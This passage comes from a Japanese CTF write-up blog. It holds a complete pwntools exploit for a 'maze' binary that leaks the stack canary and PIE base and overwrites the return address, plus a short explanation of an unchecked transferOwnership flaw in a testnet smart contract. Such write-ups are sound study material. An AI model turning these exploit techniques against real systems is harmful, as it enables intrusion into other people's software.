+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img.def2e1e68bfe4431.png" alt=""/>
+    <p>canary leak</p></div>
+</p>
+<p>同様にreturn addressも無効な文字を13文字入力するとleakすることができます。
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img1.9fe7c309515fabab.png" alt=""/>
+    <p>PIE base leak</p></div>
+</p>
+<h3 id="toratupukaranofu-gui">トラップからの復帰</h3>
+<p>ret overwriteを使ってメニュー画面に飛ぶようにするとトラップからの復帰を行えます。
+具体的には以下のようなコードを使いました。</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>loop_addr = </span><span style="color:#bf616a;">p64</span><span>(pie_base + </span><span style="color:#d08770;">0x2F7A</span><span>)
+</span><span>ret = </span><span style="color:#bf616a;">p64</span><span>(pie_base + </span><span style="color:#d08770;">0x12B8</span><span>)
+</span><span>t.</span><span style="color:#bf616a;">send</span><span>(dist + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">4 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(canary) + fake_rbp + ret + loop_addr)
+</span></code></pre>
+<p>以下の画像では、終了メッセージである<code>it is crushing</code>のあとも実行が続いていることを確認できます。
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img2.8c8527d7abbaede0.png" alt=""/>
+    <p>トラップからの復帰</p></div>
+</p>
+<h2 id="gong-ji-1">攻撃</h2>
+<p>以下の手順で解きました。</p>
+<ol>
+<li>x,yの取得</li>
+<li>canary, stack base, pie baseのleak</li>
+<li>四隅の内最も近いところまで移動</li>
+<li>0x19の正方形をすべて探索</li>
+</ol>
+<p>注意点として、非本質的なところですがサーバーとの接続は20秒で切れてしまうため<code>recvuntil</code>
+などを用いて逐次的に命令を実行するのではなく、<code>recv</code>でレスポンスをまとめて受け取ると良いです。</p>
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;img3.6702e31eb6c7a522.png" alt=""/>
+    <p>必要な値のleak</p></div>
+<h2 id="sukuriputo-1">スクリプト</h2>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>context.arch = &quot;</span><span style="color:#a3be8c;">amd64</span><span>&quot;
+</span><span>context.bits = </span><span style="color:#d08770;">64
+</span><span>context.terminal = &quot;</span><span style="color:#a3be8c;">tmux splitw -h</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>context.log_level = &quot;</span><span style="color:#a3be8c;">DEBUG</span><span>&quot;
+</span><span>
+</span><span>s2sh = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pl</span><span>: </span><span style="color:#b48ead;">b</span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">p8</span><span>(</span><span style="color:#bf616a;">int</span><span>(pl[i : i + </span><span style="color:#d08770;">2</span><span>], </span><span style="color:#d08770;">16</span><span>)) </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#96b5b4;">len</span><span>(pl), </span><span style="color:#d08770;">2</span><span>)])
+</span><span>s2u64 = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">s</span><span>: </span><span style="color:#bf616a;">u64</span><span>(s.</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">8</span><span>, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\x00</span><span>&quot;))
+</span><span>i2b = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>: </span><span style="color:#b48ead;">f</span><span>&quot;{x}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>ptr_guard = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">pos</span><span>, </span><span style="color:#bf616a;">ptr</span><span>: (pos &gt;&gt; </span><span style="color:#d08770;">12</span><span>) ^ ptr
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">create_io</span><span>() -&gt; tubes.tube.tube:
+</span><span>    </span><span style="color:#b48ead;">if </span><span>not local:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">remote</span><span>(remote_addr, </span><span style="color:#bf616a;">int</span><span>(remote_port))
+</span><span>    </span><span style="color:#b48ead;">elif </span><span>debug:
+</span><span>        </span><span style="color:#b48ead;">if </span><span>radare:
+</span><span>            io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(elf_name, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name})
+</span><span>            util.proc.</span><span style="color:#bf616a;">wait_for_debugger</span><span>(util.proc.</span><span style="color:#bf616a;">pidof</span><span>(io)[</span><span style="color:#d08770;">0</span><span>])
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            io: tubes.tube.tube = gdb.</span><span style="color:#bf616a;">debug</span><span>(
+</span><span>                [elf_name, &quot;</span><span style="color:#a3be8c;">bctf</span><span style="color:#d08770;">{REDUCTED}</span><span>&quot;], script, </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name}
+</span><span>            )
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        io: tubes.tube.tube = </span><span style="color:#bf616a;">process</span><span>(
+</span><span>            [elf_name, &quot;</span><span style="color:#a3be8c;">bctf</span><span style="color:#d08770;">{REDUCTED}</span><span>&quot;], </span><span style="color:#bf616a;">env</span><span>={&quot;</span><span style="color:#a3be8c;">LD_PRELOAD</span><span>&quot;: libc_name}
+</span><span>        )
+</span><span>    </span><span style="color:#b48ead;">return </span><span>io
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">solve</span><span>():
+</span><span>    </span><span style="color:#b48ead;">global </span><span>t
+</span><span>    sa = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendafter</span><span>(x, y)
+</span><span>    sla = </span><span style="color:#b48ead;">lambda </span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>: t.</span><span style="color:#bf616a;">sendlineafter</span><span>(x, y)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">safe_move</span><span>(</span><span style="color:#bf616a;">dist</span><span>: bytes):
+</span><span>        msg = dist + </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">4 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(canary) + fake_rbp + ret + loop_addr
+</span><span>        </span><span style="color:#b48ead;">if b</span><span>&quot;</span><span style="color:#96b5b4;">\x0a</span><span>&quot; in msg:
+</span><span>            </span><span style="color:#b48ead;">raise </span><span style="color:#bf616a;">Exception</span><span>(&quot;</span><span style="color:#a3be8c;">invalid bytes. try again.</span><span>&quot;)
+</span><span>        t.</span><span style="color:#bf616a;">send</span><span>(msg)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">do_search</span><span>():
+</span><span>        </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{x</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>} {y</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>        </span><span style="color:#b48ead;">assert </span><span>x == </span><span style="color:#d08770;">0x18 </span><span>or x == </span><span style="color:#d08770;">0x177
+</span><span>        </span><span style="color:#b48ead;">assert </span><span>y == </span><span style="color:#d08770;">0x18 </span><span>or y == </span><span style="color:#d08770;">0x177
+</span><span>
+</span><span>        x_dist = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">a</span><span>&quot; </span><span style="color:#b48ead;">if </span><span>x == </span><span style="color:#d08770;">0x18 </span><span style="color:#b48ead;">else b</span><span>&quot;</span><span style="color:#a3be8c;">d</span><span>&quot;
+</span><span>        y_dist = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">w</span><span>&quot; </span><span style="color:#b48ead;">if </span><span>y == </span><span style="color:#d08770;">0x18 </span><span style="color:#b48ead;">else b</span><span>&quot;</span><span style="color:#a3be8c;">s</span><span>&quot;
+</span><span>        </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0x18</span><span>):
+</span><span>            </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0x18</span><span>):
+</span><span>                </span><span style="color:#bf616a;">safe_move</span><span>(y_dist)
+</span><span>            y_dist = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">w</span><span>&quot; </span><span style="color:#b48ead;">if </span><span>y_dist == </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">s</span><span>&quot; </span><span style="color:#b48ead;">else b</span><span>&quot;</span><span style="color:#a3be8c;">s</span><span>&quot;
+</span><span>            </span><span style="color:#bf616a;">safe_move</span><span>(x_dist)
+</span><span>            buf = t.</span><span style="color:#bf616a;">recv</span><span>()
+</span><span>            </span><span style="color:#b48ead;">if b</span><span>&quot;</span><span style="color:#a3be8c;">bctf</span><span>&quot; in buf:
+</span><span>                </span><span style="color:#bf616a;">success</span><span>(&quot;</span><span style="color:#a3be8c;">Flag Found!!</span><span>&quot;)
+</span><span>                </span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">...</span><span>&quot;)
+</span><span>        </span><span style="color:#b48ead;">raise </span><span style="color:#bf616a;">Exception</span><span>(&quot;</span><span style="color:#a3be8c;">no flag found here</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># leak canary &amp; rbp
+</span><span>    </span><span style="color:#bf616a;">sla</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">)</span><span style="color:#96b5b4;">\n</span><span>&quot;, </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">6</span><span>)
+</span><span>    buf = t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">(</span><span>&quot;)[:-</span><span style="color:#d08770;">2</span><span>]
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">AAAAAA</span><span>&quot;) + </span><span style="color:#d08770;">5 </span><span>:]
+</span><span>    canary, rbp = buf[:</span><span style="color:#d08770;">8</span><span>], buf[</span><span style="color:#d08770;">8</span><span>:]
+</span><span>    canary = </span><span style="color:#bf616a;">s2u64</span><span>(canary) &amp; ~</span><span style="color:#d08770;">0xFF
+</span><span>    rbp = </span><span style="color:#bf616a;">s2u64</span><span>(rbp)
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{canary</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{rbp</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># get X,Y
+</span><span>    cur = t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">)</span><span>&quot;)[:-</span><span style="color:#d08770;">1</span><span>]
+</span><span>    x, y = </span><span style="color:#bf616a;">list</span><span>(</span><span style="color:#96b5b4;">map</span><span>(int, cur.</span><span style="color:#bf616a;">split</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">, </span><span>&quot;)))
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{x</span><span style="color:#b48ead;">=</span><span>} {y</span><span style="color:#b48ead;">=</span><span>}&quot;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># leak pie base
+</span><span>    t.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">5 </span><span>+ </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">B</span><span>&quot; * </span><span style="color:#d08770;">8 </span><span>+ </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">C</span><span>&quot; * </span><span style="color:#d08770;">8</span><span>)
+</span><span>    buf = t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">(</span><span>&quot;)[:-</span><span style="color:#d08770;">2</span><span>]
+</span><span>    buf = buf[buf.</span><span style="color:#bf616a;">find</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">C</span><span>&quot; * </span><span style="color:#d08770;">8</span><span>) + </span><span style="color:#d08770;">8 </span><span>:]
+</span><span>    pie_base = </span><span style="color:#bf616a;">s2u64</span><span>(buf) - </span><span style="color:#d08770;">0x3431
+</span><span>    </span><span style="color:#bf616a;">success</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{pie_base</span><span style="color:#b48ead;">=</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>    </span><span style="color:#b48ead;">assert </span><span>not pie_base &amp; </span><span style="color:#d08770;">0xFFF
+</span><span>
+</span><span>    fake_rbp = </span><span style="color:#bf616a;">p64</span><span>(rbp - </span><span style="color:#d08770;">0x280</span><span>)
+</span><span>    loop_addr = </span><span style="color:#bf616a;">p64</span><span>(pie_base + </span><span style="color:#d08770;">0x2F7A</span><span>)
+</span><span>    ret = </span><span style="color:#bf616a;">p64</span><span>(pie_base + </span><span style="color:#d08770;">0x12B8</span><span>)
+</span><span>    t.</span><span style="color:#bf616a;">send</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">A</span><span>&quot; * </span><span style="color:#d08770;">5 </span><span>+ </span><span style="color:#bf616a;">p64</span><span>(canary + </span><span style="color:#d08770;">2</span><span>) + fake_rbp + ret + loop_addr)
+</span><span>    t.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Invalid input</span><span>&quot;)
+</span><span>    t.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># Go corner
+</span><span>    x_dist = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">a</span><span>&quot; </span><span style="color:#b48ead;">if </span><span>x &lt; </span><span style="color:#d08770;">0x18F </span><span>- x </span><span style="color:#b48ead;">else b</span><span>&quot;</span><span style="color:#a3be8c;">d</span><span>&quot;
+</span><span>    x_times = </span><span style="color:#96b5b4;">min</span><span>(x - </span><span style="color:#d08770;">0x18</span><span>, </span><span style="color:#d08770;">0x177 </span><span>- x)
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{x</span><span style="color:#d08770;">:x</span><span>} {&#39;</span><span style="color:#a3be8c;">-</span><span>&#39; </span><span style="color:#b48ead;">if </span><span>x_dist==</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">a</span><span>&#39; </span><span style="color:#b48ead;">else </span><span>&#39;</span><span style="color:#a3be8c;">+</span><span>&#39;} {x_times</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>
+</span><span>    y_dist = </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">w</span><span>&quot; </span><span style="color:#b48ead;">if </span><span>y &lt; </span><span style="color:#d08770;">0x18F </span><span>- y </span><span style="color:#b48ead;">else b</span><span>&quot;</span><span style="color:#a3be8c;">s</span><span>&quot;
+</span><span>    y_times = </span><span style="color:#96b5b4;">min</span><span>(y - </span><span style="color:#d08770;">0x18</span><span>, </span><span style="color:#d08770;">0x177 </span><span>- y)
+</span><span>    </span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;{y</span><span style="color:#d08770;">:x</span><span>} {&#39;</span><span style="color:#a3be8c;">-</span><span>&#39; </span><span style="color:#b48ead;">if </span><span>y_dist==&#39;</span><span style="color:#a3be8c;">w</span><span>&#39; </span><span style="color:#b48ead;">else </span><span>&#39;</span><span style="color:#a3be8c;">+</span><span>&#39;</span><span style="color:#d08770;">:</span><span>} {y_times</span><span style="color:#d08770;">:x</span><span>}&quot;)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(x_times):
+</span><span>        </span><span style="color:#bf616a;">safe_move</span><span>(x_dist)
+</span><span>        x += -</span><span style="color:#d08770;">1 </span><span style="color:#b48ead;">if </span><span>x_dist == </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">a</span><span>&quot; </span><span style="color:#b48ead;">else </span><span style="color:#d08770;">1
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(y_times):
+</span><span>        </span><span style="color:#bf616a;">safe_move</span><span>(y_dist)
+</span><span>        y += -</span><span style="color:#d08770;">1 </span><span style="color:#b48ead;">if </span><span>y_dist == </span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">w</span><span>&quot; </span><span style="color:#b48ead;">else </span><span style="color:#d08770;">1
+</span><span>
+</span><span>    </span><span style="color:#bf616a;">do_search</span><span>()
+</span><span>    t.</span><span style="color:#bf616a;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span>local = </span><span style="color:#d08770;">0
+</span><span>debug = </span><span style="color:#d08770;">0
+</span><span>radare = </span><span style="color:#d08770;">0
+</span><span>
+</span><span>elf_name = &quot;</span><span style="color:#a3be8c;">./maze</span><span>&quot;
+</span><span>libc_name = &quot;&quot;
+</span><span>remote_addr, remote_port = &quot;</span><span style="color:#a3be8c;">chall.pwnoh.io 13387</span><span>&quot;.</span><span style="color:#bf616a;">split</span><span>()
+</span><span>elf: </span><span style="color:#bf616a;">ELF </span><span>= </span><span style="color:#bf616a;">ELF</span><span>(elf_name)
+</span><span style="color:#65737e;"># libc: ELF = ELF(libc_name)
+</span><span>script = &quot;&quot;&quot;
+</span><span>&quot;&quot;&quot;
+</span><span>found = </span><span style="color:#d08770;">False
+</span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0x300</span><span>):
+</span><span>    </span><span style="color:#b48ead;">if </span><span>found:
+</span><span>        </span><span style="color:#b48ead;">break
+</span><span>    t = </span><span style="color:#bf616a;">create_io</span><span>()
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        </span><span style="color:#bf616a;">solve</span><span>()
+</span><span>    </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
+</span><span>        </span><span style="color:#bf616a;">warn</span><span>(e)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>debug:
+</span><span>            </span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">debugging...</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">finally</span><span>:
+</span><span>        t.</span><span style="color:#bf616a;">close</span><span>()
+</span></code></pre>
+<p><code>flag: bctf{YouHavePwndDeath,ToYouGoesAFlag}</code></p>
+<h1 id="misc-new-management">[misc] New Management</h1>
+<p>Blockchain問です。Sepolia TestnetにデプロイされたSmart ContractにFlagを吐かせることが目標です。</p>
+<p>脆弱性は自明で、<code>transferOwnership</code>にチェックがついていません。
+自分をOwnerにして<code>balance[msg.sender]</code>を増やすとFlagを得ることができます。
+<code>flag: bctf{wh0_put_y0u_1n_ch4rg3}</code></p>
+<h1 id="pwn-lossless">[pwn] LossLess</h1>
+<p>WIP</p>
+<h1 id="misc-anyft">[misc] aNyFT</h1>
+<p>WIP</p>
+<h1 id="zhong-warini">終わりに</h1>
+<p>72時間CTFはいいですね。頭を冷やす時間あって、ゆっくり考えることができました。</p>
+<p>唯一の不満はヒープガチャがなかったことですね。寂しかった。</p>
+
+        </div>
+
+    
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Other posts</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://blog.rqda.wtf/vsctf-2023/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">vsctf 2023 | llm-wrapper</span>
+                        </a>
+                    </span>
+                
+                
+                    <span class="button next">
+                        <a href="https://blog.rqda.wtf/cake-2023/">
+                            <span class="button__text">CakeCTF 2023</span>&nbsp;
+                            <span class="button__icon">→</span>
+                        </a>
+                    </span>
+                </div>
+        </div>
+    
+</div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright copyright--user">&#169 2025 Rona 🐈</div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
